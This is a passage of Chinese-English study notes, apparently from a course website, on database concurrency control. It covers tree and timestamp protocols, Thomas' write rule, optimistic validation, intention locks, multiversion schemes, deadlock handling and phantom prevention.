<p>解锁请求会导致相应的请求被删除，系统会检查后续请求是否可以被授予。如果事务中止，该事务的所有等待或已授予的请求都会被删除。</p>
<p>为了高效实现这一机制，锁管理器通常会为每个事务维护一个持有锁的列表。这样，当事务完成或中止时，可以快速找到并释放该事务持有的所有锁。</p>
<p>锁管理器的实现需要考虑以下几个关键点：</p>
<ol>
<li><strong>高效的锁状态查询</strong> ：快速确定某个数据项的锁状态</li>
<li><strong>兼容性检查</strong> ：判断新的锁请求是否与现有锁兼容</li>
<li><strong>死锁检测</strong> ：识别并解决可能的死锁情况</li>
<li><strong>公平性</strong> ：确保长时间等待的事务最终能获得所需的锁</li>
</ol>
<p>这种集中式的锁管理机制虽然增加了一定的系统开销，但大大简化了并发控制的实现，并提高了系统的可靠性。</p>
</div>
<h3 id="note-db-concurrency-graph-based-protocols">Graph-Based Protocols<a class="headerlink" href="#note-db-concurrency-graph-based-protocols" title="Permanent link">&para;</a></h3>
<div class="admonition definition">
<p class="admonition-title">Definition</p>
<p><strong>基于图的协议</strong> 是二阶段锁定的一种替代方案。这种协议在数据项集合 </p>
<div class="arithmatex">\[
D = \{d_1, d_2, \ldots, d_h\}
\]</div>
<p>上施加一个偏序关系。</p>
<p>如果 <span class="arithmatex">\(d_1 \rightarrow d_2\)</span>，那么任何同时访问 <span class="arithmatex">\(d_1\)</span> 和 <span class="arithmatex">\(d_2\)</span> 的事务必须先访问 <span class="arithmatex">\(d_1\)</span> 再访问 <span class="arithmatex">\(d_2\)</span>。这意味着数据集 <span class="arithmatex">\(D\)</span> 可以被视为一个有向无环图，称为数据库图(database graph)。</p>
<p>树协议(tree-protocol)是一种简单的图协议。在树协议中，数据项被组织成一棵树的形式，事务必须按照从根到叶的顺序访问数据项。</p>
</div>
<figure markdown="span">
 ![Tree Protocol](./img/tree_protocol.png){ width="500" }
 </figure>
<p>树协议的规则如下：</p>
<ol>
<li>
<p><strong>仅允许排他锁（X锁）</strong>：树协议中只使用排他锁，不使用共享锁。</p>
</li>
<li>
<p><strong>首次加锁的灵活性</strong>：事务Ti的第一个锁可以加在任何数据项上。</p>
</li>
<li>
<p><strong>层次化加锁规则</strong>：随后，Ti只能对当前已经被Ti锁定的数据项的子节点加锁。具体来说，数据项Q只有在其父节点已被Ti锁定的情况下才能被Ti锁定。</p>
</li>
<li>
<p><strong>灵活的解锁时间</strong>：数据项可以在任何时候解锁，不必遵循严格的顺序。</p>
</li>
<li>
<p><strong>不可重复加锁</strong>：一旦某个数据项被Ti锁定并解锁后，Ti不能再次锁定该数据项。</p>
</li>
</ol>
<div class="admonition summary">
<p class="admonition-title">Summary</p>
<p>树协议的优缺点：</p>
<p><strong>优点</strong>：</p>
<ul>
<li><em>无死锁保证</em>：树协议确保了冲突可串行化以及无死锁发生</li>
<li><em>提前解锁</em>：与二阶段锁定协议相比，树协议允许更早地解锁数据项</li>
<li><em>等待时间更短</em>：在某些情况下可以提高并发度</li>
<li><em>无需回滚</em>：由于协议是无死锁的，不需要执行回滚操作</li>
</ul>
<p><strong>缺点</strong>：</p>
<ul>
<li><em>恢复性问题</em>：协议不保证可恢复性或避免级联回滚</li>
<li><em>需要额外机制</em>：为确保可恢复性，需要引入提交依赖关系</li>
<li><em>额外锁定</em>：事务可能必须锁定它们实际上不访问的数据项</li>
<li><em>锁开销增加</em>：导致额外的等待时间</li>
<li><em>并发度潜在降低</em>：在某些情况下可能降低系统的整体并发性能</li>
</ul>
<p>值得注意的是，二阶段锁定协议和树协议各有所长，某些在二阶段锁定下不可能的调度在树协议下是可能的，反之亦然。选择哪种协议取决于具体的应用场景和数据访问模式。</p>
</div>
<h2 id="note-db-concurrency-timestamp-based-protocols">Timestamp-Based Protocols<a class="headerlink" href="#note-db-concurrency-timestamp-based-protocols" title="Permanent link">&para;</a></h2>
<div class="admonition definition">
<p class="admonition-title">Definition</p>
<p>时间戳协议(Timestamp-Based Protocols)是一种基于时间戳的并发控制协议，用于管理数据库中的事务并发。每个事务在进入系统时都会被分配一个时间戳。如果一个旧事务<span class="arithmatex">\(T_i\)</span>的时间戳为<span class="arithmatex">\(TS(T_i)\)</span>，那么一个新事务<span class="arithmatex">\(T_j\)</span>将被分配时间戳<span class="arithmatex">\(TS(T_j)\)</span>，使得<span class="arithmatex">\(TS(T_i) &lt; TS(T_j)\)</span>。该协议通过时间戳来管理并发执行，以确保事务的可串行化顺序。</p>
<p>为了保证这种行为，协议为每个数据Q维护两个时间戳值：</p>
<ul>
<li>W-timestamp(Q)：是任何成功执行write(Q)的事务中最大的时间戳。也就是最晚的写时间戳。</li>
<li>R-timestamp(Q)：是任何成功执行read(Q)的事务中最大的时间戳。也就是最晚的读时间戳。</li>
</ul>
</div>
<p>Suppose a transaction Ti issues a read(Q):</p>
<ul>
<li>
<p>If <span class="arithmatex">\(TS(Ti) \leqslant W-timestamp(Q)\)</span>, then Ti needs to read a value of Q that was already overwritten. Hence, the read operation is rejected, and Ti is rolled back.有更新的事务已经写入了Q，读取操作被拒绝，事务回滚。</p>
</li>
<li>
<p>If <span class="arithmatex">\(TS(Ti) \geqslant W-timestamp(Q)\)</span>, then the read operation is executed, and <span class="arithmatex">\(R-timestamp(Q)\)</span> is set to the maximum of <span class="arithmatex">\(R-timestamp(Q)\)</span> and <span class="arithmatex">\(TS(Ti)\)</span>.OK，可以读取。</p>
</li>
</ul>
<p>Suppose that transaction Ti issues a write(Q):</p>
<ul>
<li>
<p>If <span class="arithmatex">\(TS(Ti) &lt; R-timestamp(Q)\)</span>, then the value of Q that Ti is producing was needed previously, and the system assumed that that value would never be produced. Hence, the write operation is rejected, and Ti is rolled back.有更新的事务已经读取了Q，写入的话会影响已经完成的事务，所以拒绝写入，回滚。</p>
</li>
<li>
<p>If <span class="arithmatex">\(TS(Ti) &lt; W-timestamp(Q)\)</span>, then Ti is attempting to write an obsolete value of Q. Hence, this write operation is rejected, and Ti is rolled back.有更新的事务已经写入了Q，Ti试图写入一个过时的值，所以拒绝写入，回滚。</p>
</li>
<li>
<p>Otherwise, the write operation is executed, and <span class="arithmatex">\(W-timestamp(Q)\)</span> is set to <span class="arithmatex">\(TS(Ti)\)</span>.OK，可以写入。</p>
</li>
</ul>
<figure>
<img alt="Timestamp Protocol" src="../NOTE/DB/img/timestamp.png" width="500" />

<figcaption>
    Timestamp Protocol Example
</figcaption>
</figure>
<ul>
<li>
<p><strong>优先图弧</strong>：在时间戳排序协议中，优先图的构建方式是所有的弧都是从时间戳较早的事务指向时间戳较晚的事务。这种排序确保了没有循环，因为循环意味着一个事务依赖于未来的事务，这与时间戳排序相矛盾。</p>
</li>
<li>
<p><strong>无死锁</strong>：该协议本质上避免了死锁，因为事务之间不会相互等待。如果一个事务由于时间戳冲突而无法继续，它将被回滚并以新的时间戳重新启动，确保没有事务处于等待状态。</p>
</li>
<li>
<p><strong>级联回滚</strong>：虽然时间戳协议防止了死锁，但它并不固有地防止级联回滚。当一个事务被回滚时，可能会导致其他依赖的事务也被回滚。如果一个事务读取了另一个事务写入的值，而后者事务随后被回滚，就会发生级联回滚。为了解决这个问题，事务被结构化为其所有写操作都在处理结束时执行。这确保了事务的所有写操作形成一个原子操作，这意味着在一个事务正在写入时，其他事务不能执行。如果一个事务中止，它将以新的时间戳重新启动。此方法有助于减少级联回滚效应，并确保更稳定和可恢复的调度。</p>
</li>
<li>
<p><strong>可恢复性</strong>：该协议可能还会产生不可恢复的调度。当一个事务读取了另一个事务写入的值时，如果写入事务在读取事务之前提交，调度是可恢复的。在时间戳协议中，一个事务可能会读取另一个事务的值，而后者事务随后被回滚，导致调度不可恢复。</p>
</li>
<li>
<p><strong>权衡</strong>：时间戳排序协议在简化和性能之间提供了一种权衡。它通过避免死锁简化了并发控制，但可能由于潜在的级联回滚和不可恢复的调度而产生性能成本。在实践中，可能需要额外的机制来确保可恢复性和级联自由，例如实现提交依赖关系跟踪系统或使用更复杂的并发控制协议。</p>
</li>
</ul>
<h3 id="note-db-concurrency-thomas-write-rule">Thomas' Write Rule（托马斯写规则）<a class="headerlink" href="#note-db-concurrency-thomas-write-rule" title="Permanent link">&para;</a></h3>
<div class="admonition definition">
<p class="admonition-title">Definition</p>
<p>托马斯写规则是时间戳排序协议的一种修改版本，允许在某些情况下忽略过时的写操作，从而增加潜在的并发性。此规则在视图可串行化是可接受的场景中特别有用，即使未实现冲突可串行化。</p>
<p>当事务 Ti 尝试写入数据项 Q 时：</p>
<ul>
<li>
<p>如果 <span class="arithmatex">\(TS(Ti) &lt; W-timestamp(Q)\)</span>，则 Ti 试图写入一个过时的 Q 值。与标准时间戳排序协议要求的回滚不同，此写操作被简单地忽略。这允许系统在不必要的回滚下继续处理，从而增强并发性。</p>
</li>
<li>
<p>如果 <span class="arithmatex">\(TS(Ti) \geqslant W-timestamp(Q)\)</span>，则写操作按常规执行，并将 <span class="arithmatex">\(W-timestamp(Q)\)</span> 更新为 <span class="arithmatex">\(TS(Ti)\)</span>。</p>
</li>
</ul>
<p>托马斯写规则允许视图可串行化但不一定是冲突可串行化的调度，提供了严格串行化和增加并发性之间的权衡。</p>
</div>
<ul>
<li>
<p><strong>增加的并发性</strong>：通过忽略某些过时的写操作，托马斯写规则减少了回滚次数，允许更多事务并发进行。</p>
</li>
<li>
<p><strong>视图可串行化</strong>：此规则支持视图可串行化的调度，这比冲突可串行化的调度限制更少，从而实现更灵活的事务排序。</p>
</li>
<li>
<p><strong>权衡</strong>：虽然托马斯写规则增加了并发性，但可能导致调度不是冲突可串行化的。在视图可串行化足以保证正确性的系统中，这种权衡通常是可以接受的。</p>
</li>
<li>
<p><strong>使用场景</strong>：托马斯写规则在高并发环境中特别有利，在这些环境中，管理冲突可串行化的开销过高，并且系统可以容忍视图可串行化的放松约束。</p>
</li>
</ul>
<h2 id="note-db-concurrency-validation-based-protocol">Validation-Based Protocol<a class="headerlink" href="#note-db-concurrency-validation-based-protocol" title="Permanent link">&para;</a></h2>
<p>基于验证的协议，也称为乐观并发控制（Optimistic Concurrency Control），事务的执行分为三个阶段：</p>
<ol>
<li>
<p><strong>读取和执行阶段</strong>：在此阶段，事务 Ti 仅写入临时的本地变量。所有操作都在这些本地副本上执行，而不影响实际数据库。</p>
</li>
<li>
<p><strong>验证阶段</strong>：事务 Ti 执行“验证测试”，以确定本地变量是否可以在不违反可串行化的情况下写入。这是确保事务之间不冲突的关键步骤。</p>
</li>
<li>
<p><strong>写入阶段</strong>：如果 Ti 通过验证，则更新将应用于数据库；否则，Ti 将被回滚。</p>
</li>
</ol>
<p>并发执行的事务的三个阶段可以交错进行，但每个事务必须按顺序经历这三个阶段。为了简化起见，假设验证和写入阶段是一起发生的，具有原子性和串行性，即一次只有一个事务执行验证/写入。</p>
<p>这种方法被称为乐观并发控制，因为事务在执行时完全希望在验证期间一切顺利。</p>
<ul>
<li>
<p><strong>优点</strong>：</p>
<ul>
<li><strong>增加并发性</strong>：由于事务在执行期间不锁定数据项，多个事务可以同时进行，从而提高系统吞吐量。</li>
<li><strong>减少死锁</strong>：由于没有锁的存在，消除了死锁的可能性，简化了事务管理。</li>
</ul>
</li>
<li>
<p><strong>缺点</strong>：</p>
<ul>
<li><strong>高中止率的可能性</strong>：在高争用环境中，事务验证失败的可能性增加，导致更多的中止和重试。</li>
<li><strong>复杂的验证逻辑</strong>：验证阶段可能变得复杂，特别是在有许多并发事务的系统中，因为它必须确保可串行化。</li>
</ul>
</li>
</ul>
<p>对于所有事务 Ti，如果 TS(Ti) &lt; TS(Tj)，则以下条件之一成立：</p>
<ul>
<li>
<p>finish(Ti) &lt; start(Tj)</p>
</li>
<li>
<p>start(Tj) &lt; finish(Ti) &lt; validation(Tj) 且 Ti 写入的数据项集合与 Tj 读取的数据项集合不相交。</p>
</li>
<li>
<p>如果第一个条件满足，则没有重叠的执行。</p>
</li>
<li>如果第二个条件满足，Tj 的写操作不会影响 Ti 的读操作，因为它们发生在 Ti 完成其读操作之后。</li>
<li>
<p>Ti 的写操作不会影响 Tj 的读操作，因为 Tj 没有读取 Ti 写入的任何数据项。</p>
</li>
<li>
<p><strong>验证失败</strong>：如果上述条件均不满足，则验证失败，Tj 将被中止。</p>
</li>
</ul>
<figure>
<img alt="Validation Protocol" src="../NOTE/DB/img/VALID.png" width="500" />

<figcaption>
    Validation Protocol Example
</figcaption>
</figure>
<h2 id="note-db-concurrency-multiple-granularity">Multiple Granularity<a class="headerlink" href="#note-db-concurrency-multiple-granularity" title="Permanent link">&para;</a></h2>
<p>在数据库系统中，允许数据项以不同的大小进行锁定，这被称为多粒度锁定（Multiple Granularity Locking）。这种方法通过定义数据粒度的层次结构来实现，其中较小的粒度嵌套在较大的粒度内，并可以图形化地表示为一棵树。</p>
<h3 id="note-db-concurrency-granularity-hierarchy">Granularity Hierarchy<a class="headerlink" href="#note-db-concurrency-granularity-hierarchy" title="Permanent link">&para;</a></h3>
<ul>
<li><strong>Root Node</strong>：表示整个数据库。</li>
<li><strong>Intermediate Node</strong>：表示数据库中的表或文件。</li>
<li><strong>Leaf Node</strong>：表示表中的记录或文件中的块。</li>
</ul>
<p>当事务显式地锁定树中的一个节点时，它隐式地以相同的模式锁定该节点的所有子节点。</p>
<h3 id="note-db-concurrency-locking-granularity">Locking Granularity<a class="headerlink" href="#note-db-concurrency-locking-granularity" title="Permanent link">&para;</a></h3>
<ul>
<li><strong>Fine-Grained Locking</strong>（Lower in tree）：在树的较低层次进行锁定，提供高并发性，但锁定开销较高。</li>
<li><strong>Coarse-Grained Locking</strong>（Higher in tree）：在树的较高层次进行锁定，锁定开销较低，但并发性较低。</li>
</ul>
<div class="admonition example">
<p class="admonition-title">Example</p>
<p>假设有一个数据库包含多个表，每个表包含多个记录。可以将数据库视为树的根节点，表作为中间节点，记录作为叶子节点。</p>
<ul>
<li><strong>细粒度锁定</strong>：如果一个事务需要访问特定的记录，它可以直接锁定该记录。这允许其他事务同时访问同一表中的其他记录，从而提高并发性。</li>
<li><strong>粗粒度锁定</strong>：如果一个事务需要访问整个表，它可以锁定表节点。这将阻止其他事务访问该表中的任何记录，降低并发性，但减少了锁定的开销。</li>
</ul>
<p>通过选择适当的锁定粒度，系统可以在并发性和锁定开销之间进行权衡，以满足不同的性能需求。</p>
</div>
<figure>
<img alt="Multiple Granularity" src="../NOTE/DB/img/concur1.png" width="500" />

<figcaption>
    Tree example
</figcaption>
</figure>
<h3 id="note-db-concurrency-intention-lock-modes">Intention Lock Modes<a class="headerlink" href="#note-db-concurrency-intention-lock-modes" title="Permanent link">&para;</a></h3>
<p>在多粒度锁定中，存在三种意向锁模式：</p>
<ul>
<li>
<p><strong>Intention-shared (IS，共享型意向锁)</strong>: 表明在树的较低层次存在共享锁。这意味着该节点的后代可能被显式地以共享模式锁定。</p>
</li>
<li>
<p><strong>Intention-exclusive (IX，排它型意向锁)</strong>: 表明在树的较低层次存在排他锁。这意味着该节点的后代可能被显式地以排他模式锁定。</p>
</li>
<li>
<p><strong>Shared and intention-exclusive (SIX，共享排它型意向锁)</strong>: 表明以共享模式显式锁定该节点的子树，并且在较低层次以排他模式进行显式锁定。SIX 锁是共享锁和排他意向锁的组合，即 SIX = S + IX。</p>
</li>
</ul>
<p>这些意向锁模式允许事务在不同粒度级别上安全地锁定数据项，从而提高并发性和性能。</p>
<div class="admonition example">
<p class="admonition-title">Example</p>
<p>考虑一个场景，其中多个事务正在与结构为树形的数据库交互。以下是意向锁在此上下文中的工作原理：</p>
<ul>
<li>
<p>T1 用 X 锁锁定 <code>ra1</code>：</p>
<ul>
<li><code>ra1</code> 是一个叶子节点。在用 X 锁锁定 <code>ra1</code> 之前，意向排他锁（IX）会被放置在其所有祖先节点上直到根节点。这意味着：</li>
<li>在 <code>Fa</code> 上加 IX 锁（如果 <code>ra1</code> 在 <code>Fa</code> 下）</li>
<li>在 <code>Fb</code> 上加 IX 锁（如果 <code>ra1</code> 在 <code>Fb</code> 下）</li>
<li>在根节点（整个数据库）上加 IX 锁</li>
</ul>
</li>
<li>
<p>T2 用 S 锁锁定 <code>Fb</code>：</p>
<ul>
<li><code>Fb</code> 是一个中间节点。在用 S 锁锁定 <code>Fb</code> 之前，意向共享锁（IS）会被放置在其所有祖先节点上直到根节点。这意味着：</li>
<li>在根节点（整个数据库）上加 IS 锁</li>
</ul>
</li>
<li>
<p>T3 希望用 S 锁锁定 <code>Fa</code>：</p>
<ul>
<li><code>Fa</code> 是一个中间节点。在用 S 锁锁定 <code>Fa</code> 之前，意向共享锁（IS）会被放置在其所有祖先节点上直到根节点。这意味着：</li>
<li>在根节点（整个数据库）上加 IS 锁</li>
<li>由于 <code>T1</code> 在 <code>Fa</code> 上有一个 IX 锁，<code>T3</code> 可以继续在 <code>Fa</code> 上加 S 锁，因为 IS 和 IX 是兼容的。</li>
</ul>
</li>
<li>
<p>T4 希望用 S 锁锁定整个数据库：</p>
<ul>
<li>根节点代表整个数据库。在用 S 锁锁定根节点之前，意向共享锁（IS）会被放置在其所有祖先节点上，但由于它是根节点，没有进一步的祖先节点。</li>
<li>如果没有冲突的锁，<code>T4</code> 可以继续在整个数据库上加 S 锁。然而，由于 <code>T1</code> 在根节点上有一个 IX 锁，<code>T4</code> 必须等待，因为 S 和 IX 是不兼容的。</li>
</ul>
</li>
</ul>
</div>
<figure>
<img alt="Multiple Granularity" src="../NOTE/DB/img/intent.png" width="500" />

<figcaption>
    锁之间的兼容性
</figcaption>
</figure>
<h3 id="note-db-concurrency-lock-schemas">Lock schemas<a class="headerlink" href="#note-db-concurrency-lock-schemas" title="Permanent link">&para;</a></h3>
<p>事务 Ti 可以使用以下规则锁定节点 Q：</p>
<ol>
<li>
<p><strong>锁兼容性矩阵</strong>：</p>
<ul>
<li>Ti 必须遵循锁兼容性矩阵，以确保其获取的锁不会与其他事务持有的现有锁冲突。</li>
</ul>
</li>
<li>
<p><strong>根节点锁定</strong>：</p>
<ul>
<li>必须首先锁定树的根节点。根节点可以以任何模式（S, IS, X, IX, SIX）锁定。</li>
</ul>
</li>
<li>
<p><strong>S 或 IS 模式锁定</strong>：</p>
<ul>
<li>仅当 Q 的父节点当前被 Ti 以 IX 或 IS 模式锁定时，Ti 才能以 S 或 IS 模式锁定节点 Q。</li>
</ul>
</li>
<li>
<p><strong>X, SIX 或 IX 模式锁定</strong>：</p>
<ul>
<li>仅当 Q 的父节点当前被 Ti 以 IX 或 SIX 模式锁定时，Ti 才能以 X, SIX 或 IX 模式锁定节点 Q。</li>
</ul>
</li>
<li>
<p><strong>两阶段锁定协议 (2PL)</strong>：</p>
</li>
<li>
<p>Ti 只能在尚未解锁任何节点的情况下锁定节点。这确保 Ti 遵循两阶段锁定协议。</p>
</li>
<li>
<p><strong>解锁节点</strong>：</p>
</li>
<li>Ti 只能在 Q 的所有子节点都未被 Ti 锁定的情况下解锁节点 Q。这确保锁按照从叶到根的顺序释放。</li>
</ol>
<p>优点：
- <strong>增强并发性</strong>：通过允许事务在不同粒度上锁定节点，系统可以支持更高水平的并发性。
- <strong>降低加锁开销</strong>：使用意向锁和两阶段锁定协议有助于减少与锁定相关的开销，从而提高系统性能。</p>
<h2 id="note-db-concurrency-multiversion-schemes">Multiversion Schemes<a class="headerlink" href="#note-db-concurrency-multiversion-schemes" title="Permanent link">&para;</a></h2>
<p>多版本并发控制（MVCC）是一种通过保留数据项的多个版本来提高数据库系统并发性的方法。这种方法允许事务访问不同版本的数据项而不相互干扰，从而提高系统性能并减少等待时间。</p>
<h3 id="note-db-concurrency-multiversion-timestamp-ordering">Multiversion Timestamp Ordering<a class="headerlink" href="#note-db-concurrency-multiversion-timestamp-ordering" title="Permanent link">&para;</a></h3>
<ul>
<li>
<p><strong>版本创建</strong>：每次成功的写操作都会创建数据项的新版本。这个新版本用时间戳标记，通常是执行写操作的事务的时间戳。</p>
</li>
<li>
<p><strong>读操作</strong>：当事务发出读(Q)操作时，系统根据事务的时间戳选择Q的最合适版本。选择的版本是时间戳最大且小于或等于读取事务时间戳的版本。这确保了读操作返回的数据视图与事务开始时的一致。</p>
</li>
<li>
<p><strong>并发性</strong>：读取操作永远不需要等待，因为总有一个合适的版本可用。这是多版本方案的一个显著优势，因为它允许读操作在存在并发写操作的情况下不受延迟地进行。</p>
</li>
</ul>
<h3 id="note-db-concurrency-multiversion-two-phase-locking">Multiversion Two-Phase Locking<a class="headerlink" href="#note-db-concurrency-multiversion-two-phase-locking" title="Permanent link">&para;</a></h3>
<ul>
<li>
<p><strong>锁定机制</strong>：多版本两阶段锁定（MV2PL）结合了多版本并发控制与两阶段锁定的原则。在这种方案中，读操作不需要锁，因为它们可以直接访问合适的版本。然而，写操作仍然遵循两阶段锁定协议以确保可串行化。</p>
</li>
<li>
<p><strong>版本管理</strong>：与多版本时间戳排序类似，每次写操作都会创建数据项的新版本。系统维护多个版本，每个版本都用创建它的事务的时间戳标记。</p>
</li>
<li>
<p><strong>优点</strong>：通过允许读操作在没有锁的情况下进行，MV2PL减少了争用并提高了并发性。这种方法在读操作较多的工作负载中尤其有利，因为大多数操作都是读取。</p>
</li>
</ul>
<p>总之，多版本并发控制方案，如多版本时间戳排序和多版本两阶段锁定，通过维护数据项的多个版本来增强并发性。这些方案允许读操作在不等待的情况下访问最合适的版本，从而提高系统性能并减少事务等待时间。</p>
<div class="admonition info">
<p class="admonition-title">Info</p>
<p>在多版本并发控制系统中，事务可以分为两种类型：只读事务和更新事务。每种类型遵循不同的协议以确保数据一致性和系统性能。</p>
<ul>
<li>
<p><strong>更新事务</strong>：</p>
<ul>
<li><strong>锁定协议</strong>：更新事务在访问的数据项上获取读锁和写锁。它们遵循严格的两阶段锁定协议，这意味着它们在事务完成并提交之前持有所有获取的锁。</li>
<li><strong>版本创建</strong>：更新事务的每次成功写操作都会创建数据项的新版本。这个新版本用时间戳标记。</li>
<li><strong>时间戳管理</strong>：每个新版本的时间戳是从一个计数器 <code>ts-counter</code> 中获得的，该计数器在事务提交处理期间递增。</li>
</ul>
</li>
<li>
<p><strong>只读事务</strong>：</p>
<ul>
<li><strong>时间戳分配</strong>：在执行之前，只读事务通过读取 <code>ts-counter</code> 的当前值来分配时间戳。此时间戳用于在事务执行期间确定数据版本的可见性。</li>
<li><strong>读取协议</strong>：只读事务遵循多版本时间戳排序协议。它们访问每个数据项的版本，该版本的时间戳最大且小于或等于事务的时间戳，从而确保数据库在事务开始时的一致视图。</li>
</ul>
</li>
</ul>
</div>
<h2 id="note-db-concurrency-deadlock-handling">Deadlock handling<a class="headerlink" href="#note-db-concurrency-deadlock-handling" title="Permanent link">&para;</a></h2>
<h3 id="note-db-concurrency-deadlock-prevention">Deadlock Prevention<a class="headerlink" href="#note-db-concurrency-deadlock-prevention" title="Permanent link">&para;</a></h3>
<p>Deadlock prevention protocols ensure that the system will never enter into a deadlock state. Some prevention strategies:</p>
<p>1) Require that each transaction locks all its data items before it begins execution (predeclaration) – conservative 2PL. (Either all or none are locked)
Disadvantages: bad concurrency, hard to predict </p>
<p>2) Impose partial ordering of all data items and require that a transaction can lock data items only in the order (graph-based protocol). ---- therefore never form a cycle. </p>
<ul>
<li>
<p><strong>Wait-die scheme — 非抢占式</strong>：较旧的事务可以等待较新的事务释放数据项。较新的事务永远不会等待较旧的事务；相反，它们会被回滚。一个事务可能在获取所需数据项之前多次“死亡”。</p>
</li>
<li>
<p><strong>Wound-wait scheme — 抢占式</strong>：较旧的事务会“伤害”（强制回滚）较新的事务，而不是等待它。较新的事务可以等待较旧的事务。与wait-die方案相比，可能会有更少的回滚。</p>
</li>
</ul>
<p>在wait-and-die和wound-and-wait方案中，被回滚的事务以其原始时间戳重新启动。因此，较旧的事务优先于较新的事务，从而避免了饥饿。</p>
<p>基于超时的方案：</p>
<ul>
<li>事务仅在指定的时间内等待锁。之后，等待超时，事务被回滚。</li>
<li>因此，不可能出现死锁。</li>
<li>实现简单；但可能会出现饥饿问题。此外，确定超时间隔的良好值也很困难。</li>
</ul>
<h3 id="note-db-concurrency-deadlock-detection">Deadlock Detection<a class="headerlink" href="#note-db-concurrency-deadlock-detection" title="Permanent link">&para;</a></h3>
<p>Deadlocks can be described as a wait-for graph, which consists of a pair <span class="arithmatex">\(G = (V,E)\)</span>, </p>
<p><span class="arithmatex">\(V\)</span> is a set of vertices (all the transactions in the system)
<span class="arithmatex">\(E\)</span> is a set of edges; each element is an ordered pair <span class="arithmatex">\(T_i \rightarrow T_j\)</span>.  </p>
<p>If <span class="arithmatex">\(T_i \rightarrow T_j\)</span> is in <span class="arithmatex">\(E\)</span>, then there is a directed edge from <span class="arithmatex">\(T_i\)</span> to <span class="arithmatex">\(T_j\)</span>, implying that <span class="arithmatex">\(T_i\)</span> is waiting for <span class="arithmatex">\(T_j\)</span> to release a data item.</p>
<p>When <span class="arithmatex">\(T_i\)</span> requests a data item currently being held by <span class="arithmatex">\(T_j\)</span>, then the edge <span class="arithmatex">\(T_i \rightarrow T_j\)</span> is inserted in the wait-for graph. This edge is removed only when <span class="arithmatex">\(T_j\)</span> is no longer holding a data item needed by <span class="arithmatex">\(T_i\)</span>.</p>
<div class="admonition key-point">
<p class="admonition-title">Key-point</p>
<p>The system is in a deadlock state if and only if the wait-for graph has a cycle.  Must invoke a deadlock-detection algorithm periodically to look for cycles.</p>
</div>
<h3 id="note-db-concurrency-deadlock-recovery">Deadlock Recovery<a class="headerlink" href="#note-db-concurrency-deadlock-recovery" title="Permanent link">&para;</a></h3>
<p>When a deadlock is detected, the system must choose a transaction to roll back in order to break the deadlock. The selection of the victim transaction should be based on minimizing the cost. The cost can be determined by factors such as the amount of work done by the transaction, the resources it holds, and the number of rollbacks it has already undergone to prevent starvation.</p>
<ol>
<li>
<p><strong>Victim Selection</strong>:</p>
<ul>
<li>Choose the transaction with the minimum cost as the victim.</li>
<li>Consider the number of rollbacks a transaction has already experienced as part of the cost to avoid starvation.</li>
</ul>
</li>
<li>
<p><strong>Rollback Strategy</strong>:</p>
<ul>
<li><strong>Total Rollback</strong>: Abort the transaction completely and restart it. This is straightforward but may not always be the most efficient.</li>
<li><strong>Partial Rollback</strong>: Roll back the transaction only as far as necessary to resolve the deadlock. This can be more efficient as it allows the transaction to retain some of its progress.</li>
</ul>
</li>
<li>
<p><strong>Starvation Prevention</strong>:</p>
<ul>
<li>Track the number of times each transaction has been rolled back.</li>
<li>Increase the cost factor for transactions that have been rolled back multiple times to ensure they are not repeatedly chosen as victims.</li>
</ul>
</li>
</ol>
<p>By implementing these strategies, the system can effectively manage deadlocks while minimizing the impact on transaction processing and avoiding starvation.</p>
<h3 id="note-db-concurrency-insert-and-delete">Insert and delete<a class="headerlink" href="#note-db-concurrency-insert-and-delete" title="Permanent link">&para;</a></h3>
<h3 id="note-db-concurrency-insert-and-delete-operations-in-two-phase-locking">Insert and Delete Operations in Two-Phase Locking<a class="headerlink" href="#note-db-concurrency-insert-and-delete-operations-in-two-phase-locking" title="Permanent link">&para;</a></h3>
<p>In a two-phase locking protocol, certain rules must be followed to ensure serializability when performing insert and delete operations:</p>
<ul>
<li><strong>Delete Operation</strong>: </li>
<li>
<p>A delete operation may be performed only if the transaction deleting the tuple has an exclusive (X) lock on the tuple to be deleted. This ensures that no other transaction can access the tuple while it is being deleted, maintaining data consistency.</p>
</li>
<li>
<p><strong>Insert Operation</strong>: </p>
</li>
<li>A transaction that inserts a new tuple into the database is given an X-mode lock on the tuple. This exclusive lock prevents other transactions from accessing the tuple until the insert operation is complete, ensuring that the new data is correctly integrated into the database.</li>
</ul>
<h3 id="note-db-concurrency-phantom-phenomenon">Phantom Phenomenon<a class="headerlink" href="#note-db-concurrency-phantom-phenomenon" title="Permanent link">&para;</a></h3>
<p>Insertions and deletions can lead to the phantom phenomenon, which occurs when:</p>
<ul>
<li>A transaction scans a relation (e.g., finding the sum of balances of all accounts in Perryridge).</li>
<li>Another transaction inserts a tuple into the relation (e.g., inserting a new account at Perryridge).</li>
</ul>
<p>These transactions conceptually conflict despite not accessing any tuple in common. If only tuple locks are used, non-serializable schedules can result. For example, the scan transaction may not see the new account but reads some other tuple written by the update transaction.</p>
<p>To prevent the phantom phenomenon, additional locking mechanisms, such as predicate locks or index-range locks, may be required to ensure that the set of tuples being scanned remains consistent throughout the transaction's execution.</p>
<h3 id="note-db-concurrency-index-locking-protocols">Index locking protocols<a class="headerlink" href="#note-db-concurrency-index-locking-protocols" title="Permanent link">&para;</a></h3>
<ul>
<li>每个关系必须至少有一个索引。对关系的访问必须仅通过该关系的一个索引进行。</li>
<li>执行查找的事务 Ti 必须以 S 模式锁定其访问的所有索引桶。</li>
<li>事务 Ti 不得在不更新所有关系 r 的索引的情况下将元组 ti 插入到关系 r 中。</li>
<li>Ti 必须在每个索引上执行查找，以查找所有可能已经包含指向元组 ti 的指针的索引桶，并在所有这些索引桶上以 X 模式获取锁。Ti 还必须在其修改的所有索引桶上以 X 模式获取锁。</li>
<li>必须遵守两阶段锁定协议的规则。</li>
</ul></section><section class="print-page" id="note-db-recovery" heading-number="2.2.1.13"><h1 id="note-db-recovery-recovery">Recovery<a class="headerlink" href="#note-db-recovery-recovery" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
